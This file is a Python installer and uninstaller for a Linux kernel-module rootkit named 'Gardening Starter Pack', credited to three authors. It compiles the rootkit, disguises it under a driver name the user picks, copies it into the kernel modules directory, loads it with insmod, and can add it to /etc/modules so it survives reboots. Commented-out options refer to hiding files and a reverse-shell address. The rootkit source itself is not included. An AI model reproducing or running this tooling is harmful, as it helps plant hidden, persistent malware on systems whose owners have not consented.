#! /usr/bin/python3
# This script is used for the installation and removal of the rootkit

import os
import sys
import shlex
from shutil import move
from subprocess import STDOUT, PIPE, CalledProcessError, check_output, Popen

#######
# Prompting/Printing
######

colors = {
	"RED": "\033[31m",
	"GREEN": "\033[32m",
	"YELLOW": "\033[33m",
	"BLUE": "\033[34m",
}

style = {
	"BOLD": "\033[1m",
	"RESET": "\033[0m",
}


def print_success(text):
	print(colors["GREEN"], style["BOLD"], text, style["RESET"])


def print_error(text):
	print(colors["RED"], style["BOLD"], "ERROR:", text, style["RESET"])


def print_status(text):
	print(colors["BLUE"], style["BOLD"], text, style["RESET"])


def print_question(text):
	print(colors["YELLOW"], style["BOLD"], text, style["RESET"])


def print_help():
	print("Gardening Starter Pack (Rootkit) Usage")
	print("Written by Aaron Lichtman, Arch Gupta and Brandon Weidner.")
	print("\t--install\t\tinstall the rootkit.")
	print("\t--uninstall\t\tuninstall the rootkit.")
	print("\t-h \\ --help\t\tyou seem to have figured this one out already.")


def prompt_yes_no(question):
	"""
	Prints question and waits for Y/N. Loops on invalid response.
	Returns True if Yes, False if No..
	"""
	print_question(question + " [Y / N]")
	valid_response = False
	while not valid_response:
		response = input().strip().lower()
		if response == "y":
			return True
		elif response == "n":
			return False
		else:
			print_error("Invalid response. Enter either Y or N. No other letters are valid.")


def prompt(text, default):
	"""
	Prompt with the option to leave the default.
	"""
	print_question(text + " [Default: {}]".format(default))
	response = input().strip()
	if response == "":
		return default
	else:
		return response

####
# Running Shell Commands
####


def run_cmd_exit_on_fail(command, working_dir=None, run_with_os=False):
	"""
	Command can be either a list or a string if run_with_os is False. If
	run_with_os is True, only strings are accepted. Exits if command
	returns an error.
	"""
	# TODO: Pipe all output to sp.DEVNULL when done fine-tuning build script.

	print_status("Executing: {}".format(command))
	# For some reason, check_output can't successfully run the `insmod` command.
	if run_with_os:
		if os.system(command) != 0:
			print_error("Error running command. Exiting.")
			sys.exit(1)
	else:
		try:
			if not isinstance(command, list):
				command = shlex.split(command)
			check_output(command, shell=True, stderr=STDOUT, cwd=working_dir)
		except CalledProcessError as exc:
			print_error("Error running command. Exiting.")
			print(exc.output)
			sys.exit(1)


def run_cmd(command):
	"""
	Run command and return output and exit code.
	:return: tuple of (output, returncode)
	"""
	out = Popen(shlex.split(command), stderr=STDOUT, stdout=PIPE)
	return out.communicate()[0], out.returncode

####
# Build Process
####


def create_config_header_file(user_defines: dict, path: str):
	"""
	Creates config.h file and populates it with user defined constants.
	:param: user_defines: dict
	"""
	contents = "#ifndef _CONFIG_H\n#define _CONFIG_H\n"
	for key, val in user_defines.items():
		contents += "#define {} {}\n".format(key, val)
	contents += "#endif"

	with open(path, "w") as f:
		f.write(contents)

####
# Kernel Module Loading/Unloading
####


def is_module_already_loaded(module_name):
	"""
	Returns True if module_name appears in output of $ lsmod
	"""
	output = run_cmd("lsmod")[0].decode("utf-8")
	modules = [line.split()[0] for line in output.split()]
	return module_name in modules


def is_module_already_persistent(module_name):
	"""
	If module_name is already in /etc/modules, return True. Otherwise,
	return False.
	"""
	with open("/etc/modules", "r") as f:
		if module_name in [line.strip() for line in f.readlines()]:
			print_status("Rootkit already persistent.")
			return True
		else:
			print_status("Rootkit not persistent.")
			return False


def load_module(module_path):
	print_status("Loading module...")
	run_cmd_exit_on_fail("insmod {}".format(module_path), run_with_os=True)


def unload_module(module_name):
	if is_module_already_loaded(module_name):
		print_status("Unloading module...")
		run_cmd_exit_on_fail("rmmod {}".format(module_name), run_with_os=True)

####
# Persistence
####


def enable_persistence(module_name):
	"""
	Add module_name to /etc/modules file. All modules in this file will
	be loaded on start up.
	"""
	print_status("Making rootkit persistent...")
	if not is_module_already_persistent(module_name):
		with open("/etc/modules", "a") as f:
			f.write("\n{}\n".format(module_name))
		print_success("Persistence established.")


def remove_persistence(module_name):
	print_status("Removing rootkit persistence...")
	if is_module_already_persistent(module_name):
		with open("/etc/modules", "r") as f:
			contents = f.readlines()

		with open("/etc/modules", "w") as f:
			for line in [line.strip() for line in contents if line != module_name]:
				f.write(line)
		print_success("Persistence removed.")


####
# Main Setup Methods
# 	- Install
# 	- Uninstall
####

def validate_os_and_kernel():
	"""
	Checks if the rootkit is compatible with the OS and kernel.
	Exits if it's incompatible. Returns kernel version as string if
	everything is okay.
	"""
	os_info = os.uname()
	if os_info[0].lower() != "linux":
		print_error("Not on linux. Exiting.")
		sys.exit(1)

	kernel_version = os_info[2]
	valid_kernels = ["4.18.0-15-generic", "4.18.0-16-generic"]
	if kernel_version not in valid_kernels:
		print_error("Invalid kernel. Exiting.")
		sys.exit(1)

	return kernel_version


def install(kernel_version):
	print_status("Starting rootkit installation...")

	config = {}
	config["MODULE_NAME"] = "garden"
	config["DRIVER_NAME"] = prompt("Enter the name of a kernel driver to disguise your rootkit.", "garden")
	# config["HIDDEN_FILE_PREFIX"] = prompt("Enter prefix for files to hide.", "Garden")
	# config["REVERSE_SHELL_IP_ADDR"] = prompt("Enter IP address for reverse shell.")

	run_cmd_exit_on_fail("make clean", "./rootkit")

	config_path = "./rootkit/config.h"
	print_status("Creating config file...")
	create_config_header_file(config, config_path)
	print_success("{} created.".format(config_path))

	# Compile rootkit
	print_status("Compiling rootkit...")
	run_cmd_exit_on_fail("make all", "./rootkit")
	print_success("Successful compilation.")

	# Move compiled components to the right place. Maybe drop it in "/lib/modules/kernel-version/garden?
	print_status("Installing rootkit...")
	module_dest_dir = "/lib/modules/{0}/kernel/drivers/{1}".format(kernel_version, config["DRIVER_NAME"])
	if not os.path.exists(module_dest_dir):
		os.mkdir(module_dest_dir)

	module_curr_path = "./rootkit/{}.ko".format(config["MODULE_NAME"])
	module_dest_path = "{}/{}.ko".format(module_dest_dir, config["MODULE_NAME"])

	# Move the compiled kernel module to the kernel modules directories.
	try:
		print_status("Moving {} to {}".format(module_curr_path, module_dest_path))
		move(module_curr_path, module_dest_path)
	except IOError as e:
		print_error("Unable to copy file. {}".format(e))
		sys.exit()

	# Option to enable persistence by making the module load on boot.
	if prompt_yes_no("Enable persistence?"):
		enable_persistence(config["MODULE_NAME"])

	run_cmd_exit_on_fail("depmod")
	# Unload kernel module if it's already loaded.
	unload_module(config["MODULE_NAME"])
	# Load kernel module
	load_module(module_dest_path)
	print_success("Successful installation.")


def uninstall():
	"""
	Remove persistence and unload module.
	"""
	print_status("Starting rootkit removal...")
	module = prompt("Enter the name of the module to remove.", "garden")
	remove_persistence(module)
	unload_module(module)
	print_success("Removed {} from modules.".format(module))


def main():
	"""
	Check to see that the rootkit works on this OS and kernel.
	If it can, process args to proceed to installation/removal/help.
	"""
	kernel_version = validate_os_and_kernel()

	if sys.argv[1] not in ["install", "uninstall"]:
		print_help()
	elif "install" == sys.argv[1]:
		install(kernel_version)
	elif "uninstall" == sys.argv[1]:
		uninstall()


if __name__ == "__main__":
    main()
